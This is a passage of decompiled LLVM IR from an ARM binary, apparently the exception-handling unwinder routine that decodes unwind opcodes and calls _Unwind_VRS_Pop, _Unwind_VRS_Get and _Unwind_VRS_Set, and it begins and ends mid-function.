  %v1_17d5c = and i32 %v3_17d4c, 240
  store i32 %v1_17d5c, i32* %r3.global-to-local, align 4
  %v1_17d60 = load i32, i32* @r5, align 4
  %v2_17d60 = inttoptr i32 %v1_17d60 to i32*
  store i32 %v3_17d54, i32* %v2_17d60, align 4
  %v0_17d64 = load i32, i32* %r2.global-to-local, align 4
  %v1_17d64 = load i32, i32* %r3.global-to-local, align 4
  %v4_17d64 = mul i32 %v1_17d64, 4096
  %v5_17d64 = or i32 %v4_17d64, %v0_17d64
  br label %dec_label_pc_17d68

dec_label_pc_17d68:                               ; preds = %dec_label_pc_17d18, %dec_label_pc_17d4c
  %storemerge132 = phi i32 [ %v5_17d64, %dec_label_pc_17d4c ], [ 720897, %dec_label_pc_17d18 ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17c88

dec_label_pc_17d70:                               ; preds = %dec_label_pc_17cfc
  %v1_17d70 = and i32 %v0_179e0, 252
  store i32 %v1_17d70, i32* %r3.global-to-local, align 4
  %v7_17d74 = icmp eq i32 %v1_17d70, 180
  store i1 %v7_17d74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17d74, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_17d70
  %v2_17d78 = urem i32 %v0_179e0, 4
  %v2_17d80 = add nuw nsw i32 %v2_17d78, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_17d8c = or i32 %v2_17d80, 262144
  store i32 %v2_17d8c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17c88

bb157:                                            ; preds = %dec_label_pc_17d70
  %v2_17d7c = urem i32 %v0_17cec, 8
  %v2_17d84 = add nuw nsw i32 %v2_17d7c, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_17d94 = or i32 %v2_17d84, 524288
  store i32 %v2_17d94, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17c88

dec_label_pc_17d9c:                               ; preds = %dec_label_pc_17cac
  %v0_17d9c = load i32, i32* %ip.global-to-local, align 4
  %v7_17d9c = icmp eq i32 %v0_17d9c, 198
  store i1 %v7_17d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17d9c, label %dec_label_pc_17da4, label %dec_label_pc_17ba8

dec_label_pc_17da4:                               ; preds = %dec_label_pc_17d9c
  %v0_17da4 = load i32, i32* @r5, align 4
  %v1_17da4 = add i32 %v0_17da4, 8
  %v2_17da4 = inttoptr i32 %v1_17da4 to i8*
  %v3_17da4 = load i8, i8* %v2_17da4, align 1
  %v4_17da4 = zext i8 %v3_17da4 to i32
  store i32 %v4_17da4, i32* %r3.global-to-local, align 4
  %v2_17da8 = icmp eq i8 %v3_17da4, 0
  store i1 %v2_17da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17da8, label %dec_label_pc_17db8, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_17da4
  %v2_17dac = add nsw i32 %v4_17da4, -1
  store i32 %v2_17dac, i32* %r3.global-to-local, align 4
  %v2_17db0 = trunc i32 %v2_17dac to i8
  store i8 %v2_17db0, i8* %v2_17da4, align 1
  %v0_17db4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17db4.pr.pr, label %.thread48.dec_label_pc_17db8_crit_edge, label %dec_label_pc_17dec

.thread48.dec_label_pc_17db8_crit_edge:           ; preds = %.thread48
  %v0_17db8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17db8

dec_label_pc_17db8:                               ; preds = %.thread48.dec_label_pc_17db8_crit_edge, %dec_label_pc_17da4
  %v2_17dd0 = phi i32 [ %v0_17db8.pre, %.thread48.dec_label_pc_17db8_crit_edge ], [ %v0_17da4, %dec_label_pc_17da4 ]
  %v1_17db8 = add i32 %v2_17dd0, 9
  %v2_17db8 = inttoptr i32 %v1_17db8 to i8*
  %v3_17db8 = load i8, i8* %v2_17db8, align 1
  %v4_17db8 = zext i8 %v3_17db8 to i32
  store i32 %v4_17db8, i32* %r3.global-to-local, align 4
  %v2_17dbc = icmp eq i8 %v3_17db8, 0
  store i1 %v2_17dbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17dbc, label %dec_label_pc_17e08, label %dec_label_pc_17dcc

dec_label_pc_17dcc:                               ; preds = %dec_label_pc_17db8
  %v1_17dcc = add nsw i32 %v4_17db8, -1
  store i32 %v1_17dcc, i32* %r3.global-to-local, align 4
  %v1_17dd0 = trunc i32 %v1_17dcc to i8
  store i8 %v1_17dd0, i8* %v2_17db8, align 1
  %v0_17dd4 = load i32, i32* @r5, align 4
  %v1_17dd4 = add i32 %v0_17dd4, 4
  %v2_17dd4 = inttoptr i32 %v1_17dd4 to i32*
  %v3_17dd4 = load i32, i32* %v2_17dd4, align 4
  store i32 %v3_17dd4, i32* %r2.global-to-local, align 4
  %v1_17dd8 = inttoptr i32 %v3_17dd4 to i32*
  %v2_17dd8 = load i32, i32* %v1_17dd8, align 4
  store i32 %v2_17dd8, i32* %r0.global-to-local, align 4
  %v4_17dd8 = add i32 %v3_17dd4, 4
  store i32 %v4_17dd8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_17dd8, i32* %v2_17dd4, align 4
  %v0_17de4 = load i32, i32* %r3.global-to-local, align 4
  %v1_17de4 = trunc i32 %v0_17de4 to i8
  %v2_17de4 = load i32, i32* @r5, align 4
  %v3_17de4 = add i32 %v2_17de4, 8
  %v4_17de4 = inttoptr i32 %v3_17de4 to i8*
  store i8 %v1_17de4, i8* %v4_17de4, align 1
  %v0_17de8 = load i32, i32* %r0.global-to-local, align 4
  %v1_17de8 = load i32, i32* @r5, align 4
  %v2_17de8 = inttoptr i32 %v1_17de8 to i32*
  store i32 %v0_17de8, i32* %v2_17de8, align 4
  br label %dec_label_pc_17dec

dec_label_pc_17dec:                               ; preds = %.thread48, %dec_label_pc_17dcc
  %v0_17dec = load i32, i32* %r0.global-to-local, align 4
  %v3_17dec = udiv i32 %v0_17dec, 16777216
  %v1_17df0 = urem i32 %v3_17dec, 16
  %v3_17df4 = mul i32 %v0_17dec, 256
  store i32 %v3_17df4, i32* %r0.global-to-local, align 4
  %v1_17df8 = add nuw nsw i32 %v1_17df0, 1
  store i32 %v1_17df8, i32* %r2.global-to-local, align 4
  %v1_17dfc = and i32 %v3_17dec, 240
  store i32 %v1_17dfc, i32* %r3.global-to-local, align 4
  %v1_17e00 = load i32, i32* @r5, align 4
  %v2_17e00 = inttoptr i32 %v1_17e00 to i32*
  store i32 %v3_17df4, i32* %v2_17e00, align 4
  %v0_17e04 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e04 = load i32, i32* %r3.global-to-local, align 4
  %v4_17e04 = mul i32 %v1_17e04, 4096
  %v5_17e04 = or i32 %v4_17e04, %v0_17e04
  br label %dec_label_pc_17e08

dec_label_pc_17e08:                               ; preds = %dec_label_pc_17db8, %dec_label_pc_17dec
  %storemerge131 = phi i32 [ %v5_17e04, %dec_label_pc_17dec ], [ 720897, %dec_label_pc_17db8 ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17c88

dec_label_pc_17e10:                               ; preds = %dec_label_pc_17bcc
  %v0_17e10 = load i32, i32* @r5, align 4
  %v1_17e10 = add i32 %v0_17e10, 8
  %v2_17e10 = inttoptr i32 %v1_17e10 to i8*
  %v3_17e10 = load i8, i8* %v2_17e10, align 1
  %v4_17e10 = zext i8 %v3_17e10 to i32
  store i32 %v4_17e10, i32* %r3.global-to-local, align 4
  %v2_17e14 = icmp eq i8 %v3_17e10, 0
  store i1 %v2_17e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e14, label %dec_label_pc_17e24, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_17e10
  %v2_17e18 = add nsw i32 %v4_17e10, -1
  store i32 %v2_17e18, i32* %r3.global-to-local, align 4
  %v2_17e1c = trunc i32 %v2_17e18 to i8
  store i8 %v2_17e1c, i8* %v2_17e10, align 1
  %v0_17e20.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17e20.pr.pr, label %.thread52.dec_label_pc_17e24_crit_edge, label %dec_label_pc_17e58

.thread52.dec_label_pc_17e24_crit_edge:           ; preds = %.thread52
  %v0_17e24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17e24

dec_label_pc_17e24:                               ; preds = %.thread52.dec_label_pc_17e24_crit_edge, %dec_label_pc_17e10
  %v2_17e3c = phi i32 [ %v0_17e24.pre, %.thread52.dec_label_pc_17e24_crit_edge ], [ %v0_17e10, %dec_label_pc_17e10 ]
  %v1_17e24 = add i32 %v2_17e3c, 9
  %v2_17e24 = inttoptr i32 %v1_17e24 to i8*
  %v3_17e24 = load i8, i8* %v2_17e24, align 1
  %v4_17e24 = zext i8 %v3_17e24 to i32
  store i32 %v4_17e24, i32* %r3.global-to-local, align 4
  %v2_17e28 = icmp eq i8 %v3_17e24, 0
  store i1 %v2_17e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e28, label %dec_label_pc_17e74, label %dec_label_pc_17e38

dec_label_pc_17e38:                               ; preds = %dec_label_pc_17e24
  %v1_17e38 = add nsw i32 %v4_17e24, -1
  store i32 %v1_17e38, i32* %r3.global-to-local, align 4
  %v1_17e3c = trunc i32 %v1_17e38 to i8
  store i8 %v1_17e3c, i8* %v2_17e24, align 1
  %v0_17e40 = load i32, i32* @r5, align 4
  %v1_17e40 = add i32 %v0_17e40, 4
  %v2_17e40 = inttoptr i32 %v1_17e40 to i32*
  %v3_17e40 = load i32, i32* %v2_17e40, align 4
  store i32 %v3_17e40, i32* %r2.global-to-local, align 4
  %v1_17e44 = inttoptr i32 %v3_17e40 to i32*
  %v2_17e44 = load i32, i32* %v1_17e44, align 4
  store i32 %v2_17e44, i32* %r0.global-to-local, align 4
  %v4_17e44 = add i32 %v3_17e40, 4
  store i32 %v4_17e44, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_17e44, i32* %v2_17e40, align 4
  %v0_17e50 = load i32, i32* %r3.global-to-local, align 4
  %v1_17e50 = trunc i32 %v0_17e50 to i8
  %v2_17e50 = load i32, i32* @r5, align 4
  %v3_17e50 = add i32 %v2_17e50, 8
  %v4_17e50 = inttoptr i32 %v3_17e50 to i8*
  store i8 %v1_17e50, i8* %v4_17e50, align 1
  %v0_17e54 = load i32, i32* %r0.global-to-local, align 4
  %v1_17e54 = load i32, i32* @r5, align 4
  %v2_17e54 = inttoptr i32 %v1_17e54 to i32*
  store i32 %v0_17e54, i32* %v2_17e54, align 4
  br label %dec_label_pc_17e58

dec_label_pc_17e58:                               ; preds = %.thread52, %dec_label_pc_17e38
  %v0_17e58 = load i32, i32* %r0.global-to-local, align 4
  %v3_17e58 = udiv i32 %v0_17e58, 16777216
  %v1_17e5c = urem i32 %v3_17e58, 16
  %v3_17e60 = mul i32 %v0_17e58, 256
  store i32 %v3_17e60, i32* %r0.global-to-local, align 4
  %v1_17e64 = add nuw nsw i32 %v1_17e5c, 1
  store i32 %v1_17e64, i32* %r2.global-to-local, align 4
  %v1_17e68 = and i32 %v3_17e58, 240
  store i32 %v1_17e68, i32* %r3.global-to-local, align 4
  %v1_17e6c = load i32, i32* @r5, align 4
  %v2_17e6c = inttoptr i32 %v1_17e6c to i32*
  store i32 %v3_17e60, i32* %v2_17e6c, align 4
  %v0_17e70 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e70 = load i32, i32* %r3.global-to-local, align 4
  %v4_17e70 = mul i32 %v1_17e70, 4096
  %v5_17e70 = or i32 %v4_17e70, %v0_17e70
  br label %dec_label_pc_17e74

dec_label_pc_17e74:                               ; preds = %dec_label_pc_17e24, %dec_label_pc_17e58
  %storemerge130 = phi i32 [ %v5_17e70, %dec_label_pc_17e58 ], [ 720897, %dec_label_pc_17e24 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17c88

dec_label_pc_17e7c:                               ; preds = %dec_label_pc_17ba8
  %v0_17e7c = load i32, i32* @r5, align 4
  %v1_17e7c = add i32 %v0_17e7c, 8
  %v2_17e7c = inttoptr i32 %v1_17e7c to i8*
  %v3_17e7c = load i8, i8* %v2_17e7c, align 1
  %v4_17e7c = zext i8 %v3_17e7c to i32
  store i32 %v4_17e7c, i32* %r3.global-to-local, align 4
  %v2_17e80 = icmp eq i8 %v3_17e7c, 0
  store i1 %v2_17e80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e80, label %dec_label_pc_18028, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_17e7c
  %v2_17e84 = add nsw i32 %v4_17e7c, -1
  store i32 %v2_17e84, i32* %r3.global-to-local, align 4
  %v2_17e88 = trunc i32 %v2_17e84 to i8
  store i8 %v2_17e88, i8* %v2_17e7c, align 1
  %v0_17e8c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17e8c.pr.pr, label %.thread56.dec_label_pc_18028_crit_edge, label %dec_label_pc_17e90

.thread56.dec_label_pc_18028_crit_edge:           ; preds = %.thread56
  %v0_18028.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18028

dec_label_pc_17e90:                               ; preds = %.thread56, %dec_label_pc_18034
  %v0_17e90 = load i32, i32* %r0.global-to-local, align 4
  %v3_17e90 = udiv i32 %v0_17e90, 16777216
  store i32 %v3_17e90, i32* %r3.global-to-local, align 4
  store i32 %v3_17e90, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_17e90, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_17e98 = mul i32 %v0_17e90, 256
  store i32 %v3_17e98, i32* %r0.global-to-local, align 4
  %v1_17e9c = load i32, i32* @r5, align 4
  %v2_17e9c = inttoptr i32 %v1_17e9c to i32*
  store i32 %v3_17e98, i32* %v2_17e9c, align 4
  br i1 %tmp184, label %dec_label_pc_17c58, label %dec_label_pc_17ea4

dec_label_pc_17ea4:                               ; preds = %dec_label_pc_17e90
  %v0_17ea4 = load i32, i32* %r3.global-to-local, align 4
  %v1_17ea4 = and i32 %v0_17ea4, 240
  store i32 %v1_17ea4, i32* %r3.global-to-local, align 4
  %v2_17ea4 = icmp eq i32 %v1_17ea4, 0
  store i1 %v2_17ea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ea4, label %dec_label_pc_17eac, label %dec_label_pc_17c58

dec_label_pc_17eac:                               ; preds = %dec_label_pc_17ea4
  %v0_17eac = load i32, i32* @r7, align 4
  store i32 %v0_17eac, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_17eb4 = load i32, i32* %r2.global-to-local, align 4
  %v4_17eb4 = call i32 @_Unwind_VRS_Pop(i32 %v0_17eac, i32 4, i32 %v2_17eb4, i32 0)
  store i32 %v4_17eb4, i32* %r0.global-to-local, align 4
  %v2_17eb8 = icmp eq i32 %v4_17eb4, 0
  store i1 %v2_17eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17eb8, label %dec_label_pc_17988.backedge, label %dec_label_pc_17ec0

dec_label_pc_17ec0:                               ; preds = %dec_label_pc_17eac
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ab0

dec_label_pc_17ec8:                               ; preds = %dec_label_pc_17cf4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17ed4 = load i32, i32* @r7, align 4
  store i32 %v0_17ed4, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_17ee0 = call i32 @_Unwind_VRS_Get(i32 %v0_17ed4, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17ee0, i32* %r0.global-to-local, align 4
  %v0_17ee4 = load i32, i32* @r5, align 4
  %v1_17ee4 = add i32 %v0_17ee4, 8
  %v2_17ee4 = inttoptr i32 %v1_17ee4 to i8*
  %v3_17ee4 = load i8, i8* %v2_17ee4, align 1
  %v4_17ee4 = zext i8 %v3_17ee4 to i32
  store i32 %v4_17ee4, i32* %r1.global-to-local, align 4
  %v2_17ee8 = icmp eq i8 %v3_17ee4, 0
  store i1 %v2_17ee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ee8, label %dec_label_pc_17ef8, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_17ec8
  %v2_17eec = add nsw i32 %v4_17ee4, -1
  store i32 %v2_17eec, i32* %r3.global-to-local, align 4
  %v2_17ef0 = trunc i32 %v2_17eec to i8
  store i8 %v2_17ef0, i8* %v2_17ee4, align 1
  %v0_17ef4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17ef4.pr.pr, label %.thread58.dec_label_pc_17ef8_crit_edge, label %dec_label_pc_17f24

.thread58.dec_label_pc_17ef8_crit_edge:           ; preds = %.thread58
  %v0_17ef8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17ef8

dec_label_pc_17ef8:                               ; preds = %.thread58.dec_label_pc_17ef8_crit_edge, %dec_label_pc_17ec8
  %v2_17f0c = phi i32 [ %v0_17ef8.pre, %.thread58.dec_label_pc_17ef8_crit_edge ], [ %v0_17ee4, %dec_label_pc_17ec8 ]
  %v1_17ef8 = add i32 %v2_17f0c, 9
  %v2_17ef8 = inttoptr i32 %v1_17ef8 to i8*
  %v3_17ef8 = load i8, i8* %v2_17ef8, align 1
  %v4_17ef8 = zext i8 %v3_17ef8 to i32
  store i32 %v4_17ef8, i32* %r3.global-to-local, align 4
  %v2_17efc = icmp eq i8 %v3_17ef8, 0
  store i1 %v2_17efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17efc, label %bb158, label %dec_label_pc_17f08

bb158:                                            ; preds = %dec_label_pc_17ef8
  %v1_17f00 = load i32, i32* @r6, align 4
  store i32 %v1_17f00, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17f4c

dec_label_pc_17f08:                               ; preds = %dec_label_pc_17ef8
  %v1_17f08 = add nsw i32 %v4_17ef8, -1
  store i32 %v1_17f08, i32* %r3.global-to-local, align 4
  %v1_17f0c = trunc i32 %v1_17f08 to i8
  store i8 %v1_17f0c, i8* %v2_17ef8, align 1
  %v0_17f10 = load i32, i32* @r5, align 4
  %v1_17f10 = add i32 %v0_17f10, 4
  %v2_17f10 = inttoptr i32 %v1_17f10 to i32*
  %v3_17f10 = load i32, i32* %v2_17f10, align 4
  store i32 %v3_17f10, i32* %r2.global-to-local, align 4
  %v1_17f14 = inttoptr i32 %v3_17f10 to i32*
  %v2_17f14 = load i32, i32* %v1_17f14, align 4
  store i32 %v2_17f14, i32* %r0.global-to-local, align 4
  %v4_17f14 = add i32 %v3_17f10, 4
  store i32 %v4_17f14, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_17f1c = inttoptr i32 %v0_17f10 to i32*
  store i32 %v2_17f14, i32* %v1_17f1c, align 4
  %v5_17f1c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_17f1c, i32* %v2_17f10, align 4
  %v0_17f20 = load i32, i32* %r3.global-to-local, align 4
  %v1_17f20 = trunc i32 %v0_17f20 to i8
  %v2_17f20 = load i32, i32* @r5, align 4
  %v3_17f20 = add i32 %v2_17f20, 8
  %v4_17f20 = inttoptr i32 %v3_17f20 to i8*
  store i8 %v1_17f20, i8* %v4_17f20, align 1
  br label %dec_label_pc_17f24

dec_label_pc_17f24:                               ; preds = %.thread58, %dec_label_pc_17f08
  %v0_17f24 = load i32, i32* @r5, align 4
  %v1_17f24 = inttoptr i32 %v0_17f24 to i32*
  %v2_17f24 = load i32, i32* %v1_17f24, align 4
  store i32 %v2_17f24, i32* %r3.global-to-local, align 4
  %v3_17f28 = mul i32 %v2_17f24, 256
  store i32 %v3_17f28, i32* %r0.global-to-local, align 4
  %v3_17f2c = udiv i32 %v2_17f24, 16777216
  store i32 %v3_17f2c, i32* %r2.global-to-local, align 4
  store i32 %v3_17f28, i32* %v1_17f24, align 4
  %v0_17f34 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f34 = and i32 %v0_17f34, 128
  %v2_17f34 = icmp eq i32 %v1_17f34, 0
  store i1 %v2_17f34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17f34, label %.thread129, label %dec_label_pc_17f48

.thread129:                                       ; preds = %dec_label_pc_17f24
  %v4_17f38 = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_17f38, i32* %ip.global-to-local, align 4
  %v1_17f3c = urem i32 %v0_17f34, 256
  store i32 %v1_17f3c, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_17fbc

dec_label_pc_17f48:                               ; preds = %dec_label_pc_17f24
  %v1_17f3c63 = urem i32 %v0_17f34, 256
  store i32 %v1_17f3c63, i32* %r2.global-to-local, align 4
  %v0_17f48 = load i32, i32* @r5, align 4
  %v1_17f48 = add i32 %v0_17f48, 8
  %v2_17f48 = inttoptr i32 %v1_17f48 to i8*
  %v3_17f48 = load i8, i8* %v2_17f48, align 1
  %v4_17f48 = zext i8 %v3_17f48 to i32
  store i32 %v4_17f48, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17f4c

dec_label_pc_17f4c:                               ; preds = %bb158, %dec_label_pc_17f48
  %v3_17f6c99 = phi i32 [ %v2_17f0c, %bb158 ], [ %v0_17f48, %dec_label_pc_17f48 ]
  %v0_17f5492 = phi i32 [ %v1_17f00, %bb158 ], [ %v1_17f3c63, %dec_label_pc_17f48 ]
  %v3_17f4c = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_17f4c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17f54

dec_label_pc_17f54:                               ; preds = %dec_label_pc_17f54.backedge, %dec_label_pc_17f4c
  %v3_17f6c = phi i32 [ %v3_17f6c100, %dec_label_pc_17f54.backedge ], [ %v3_17f6c99, %dec_label_pc_17f4c ]
  %v0_17f68 = phi i32 [ %v2_17f58.pre, %dec_label_pc_17f54.backedge ], [ 2, %dec_label_pc_17f4c ]
  %v0_17f58 = phi i32 [ %v0_17f58.pre, %dec_label_pc_17f54.backedge ], [ %v3_17f4c, %dec_label_pc_17f4c ]
  %v0_17f54 = phi i32 [ %v0_17f5495, %dec_label_pc_17f54.backedge ], [ %v0_17f5492, %dec_label_pc_17f4c ]
  %v1_17f54 = urem i32 %v0_17f54, 128
  %v7_17f58 = shl i32 %v1_17f54, %v0_17f68
  %v8_17f58 = add i32 %v7_17f58, %v0_17f58
  store i32 %v8_17f58, i32* %ip.global-to-local, align 4
  %v0_17f5c = load i32, i32* %r1.global-to-local, align 4
  %v2_17f5c = icmp eq i32 %v0_17f5c, 0
  store i1 %v2_17f5c, i1* %cpsr_z.global-to-local, align 1
  %v1_17f60 = add i32 %v0_17f5c, -1
  store i32 %v1_17f60, i32* %r3.global-to-local, align 4
  store i32 %v8_17f58, i32* %stack_var_-36, align 4
  %v1_17f68 = add i32 %v0_17f68, 7
  store i32 %v1_17f68, i32* @lr, align 4
  br i1 %v2_17f5c, label %dec_label_pc_17f74, label %bb159

bb159:                                            ; preds = %dec_label_pc_17f54
  %v2_17f6c = trunc i32 %v1_17f60 to i8
  %v4_17f6c = add i32 %v3_17f6c, 8
  %v5_17f6c = inttoptr i32 %v4_17f6c to i8*
  store i8 %v2_17f6c, i8* %v5_17f6c, align 1
  %v0_17f70.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17f70.pr, label %.dec_label_pc_17f74_crit_edge, label %dec_label_pc_17fa0

.dec_label_pc_17f74_crit_edge:                    ; preds = %bb159
  %v0_17f74.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17f74

dec_label_pc_17f74:                               ; preds = %.dec_label_pc_17f74_crit_edge, %dec_label_pc_17f54
  %v2_17f8c = phi i32 [ %v0_17f74.pre, %.dec_label_pc_17f74_crit_edge ], [ %v3_17f6c, %dec_label_pc_17f54 ]
  %v1_17f74 = add i32 %v2_17f8c, 9
  %v2_17f74 = inttoptr i32 %v1_17f74 to i8*
  %v3_17f74 = load i8, i8* %v2_17f74, align 1
  %v4_17f74 = zext i8 %v3_17f74 to i32
  store i32 %v4_17f74, i32* %r3.global-to-local, align 4
  %v2_17f78 = icmp eq i8 %v3_17f74, 0
  store i1 %v2_17f78, i1* %cpsr_z.global-to-local, align 1
  %v1_17f7c = add nsw i32 %v4_17f74, -1
  store i32 %v1_17f7c, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_17f78, label %dec_label_pc_17f54.backedge, label %dec_label_pc_17f88

dec_label_pc_17f88:                               ; preds = %dec_label_pc_17f74
  %v1_17f88 = add i32 %v2_17f8c, 4
  %v2_17f88 = inttoptr i32 %v1_17f88 to i32*
  %v3_17f88 = load i32, i32* %v2_17f88, align 4
  store i32 %v3_17f88, i32* %r2.global-to-local, align 4
  %v1_17f8c = trunc i32 %v1_17f7c to i8
  store i8 %v1_17f8c, i8* %v2_17f74, align 1
  %v0_17f90 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f90 = inttoptr i32 %v0_17f90 to i32*
  %v2_17f90 = load i32, i32* %v1_17f90, align 4
  store i32 %v2_17f90, i32* %r0.global-to-local, align 4
  %v4_17f90 = add i32 %v0_17f90, 4
  store i32 %v4_17f90, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_17f98 = load i32, i32* @r5, align 4
  %v3_17f98 = add i32 %v2_17f98, 8
  %v4_17f98 = inttoptr i32 %v3_17f98 to i8*
  store i8 3, i8* %v4_17f98, align 1
  %v0_17f9c = load i32, i32* @r5, align 4
  %v1_17f9c = inttoptr i32 %v0_17f9c to i32*
  %v2_17f9c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_17f9c, i32* %v1_17f9c, align 4
  %v3_17f9c = add i32 %v0_17f9c, 4
  %v4_17f9c = inttoptr i32 %v3_17f9c to i32*
  %v5_17f9c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_17f9c, i32* %v4_17f9c, align 4
  br label %dec_label_pc_17fa0

dec_label_pc_17fa0:                               ; preds = %bb159, %dec_label_pc_17f88
  %v0_17fa0 = load i32, i32* @r5, align 4
  %v1_17fa0 = inttoptr i32 %v0_17fa0 to i32*
  %v2_17fa0 = load i32, i32* %v1_17fa0, align 4
  store i32 %v2_17fa0, i32* %r3.global-to-local, align 4
  %v3_17fa4 = udiv i32 %v2_17fa0, 16777216
  store i32 %v3_17fa4, i32* %r2.global-to-local, align 4
  %v1_17fa8 = and i32 %v3_17fa4, 128
  %v2_17fa8 = icmp eq i32 %v1_17fa8, 0
  store i1 %v2_17fa8, i1* %cpsr_z.global-to-local, align 1
  %v3_17fac = mul i32 %v2_17fa0, 256
  store i32 %v3_17fac, i32* %r0.global-to-local, align 4
  store i32 %v3_17fac, i32* %v1_17fa0, align 4
  %v0_17fb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17fb4 = urem i32 %v0_17fb4, 256
  store i32 %v1_17fb4, i32* %r2.global-to-local, align 4
  br i1 %v2_17fa8, label %dec_label_pc_17fbc.loopexit, label %dec_label_pc_17fe8

dec_label_pc_17fbc.loopexit:                      ; preds = %dec_label_pc_17fa0
  %v0_17fc0.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_17fc4.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_17fbc

dec_label_pc_17fbc:                               ; preds = %dec_label_pc_17fbc.loopexit, %.thread129
  %v2_17fc4 = phi i32 [ 2, %.thread129 ], [ %v2_17fc4.pre, %dec_label_pc_17fbc.loopexit ]
  %v0_17fc0 = phi i32 [ %v4_17f38, %.thread129 ], [ %v0_17fc0.pre, %dec_label_pc_17fbc.loopexit ]
  %v0_17fbc = phi i32 [ %v1_17f3c, %.thread129 ], [ %v1_17fb4, %dec_label_pc_17fbc.loopexit ]
  %v1_17fbc = urem i32 %v0_17fbc, 128
  %v1_17fc0 = add i32 %v0_17fc0, 516
  %v7_17fc4 = shl i32 %v1_17fbc, %v2_17fc4
  %v8_17fc4 = add i32 %v1_17fc0, %v7_17fc4
  store i32 %v8_17fc4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17fcc = load i32, i32* @r7, align 4
  store i32 %v0_17fcc, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_17fc4, i32* %stack_var_-36, align 4
  %v5_17fe0 = call i32 @_Unwind_VRS_Set(i32 %v0_17fcc, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17fe0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17988.backedge

dec_label_pc_17fe8:                               ; preds = %dec_label_pc_17fa0
  %v0_17fe8 = load i32, i32* @r5, align 4
  %v1_17fe8 = add i32 %v0_17fe8, 8
  %v2_17fe8 = inttoptr i32 %v1_17fe8 to i8*
  %v3_17fe8 = load i8, i8* %v2_17fe8, align 1
  %v4_17fe8 = zext i8 %v3_17fe8 to i32
  store i32 %v4_17fe8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17f54.backedge

dec_label_pc_17f54.backedge:                      ; preds = %dec_label_pc_17fe8, %dec_label_pc_17f74
  %v3_17f6c100 = phi i32 [ %v0_17fe8, %dec_label_pc_17fe8 ], [ %v2_17f8c, %dec_label_pc_17f74 ]
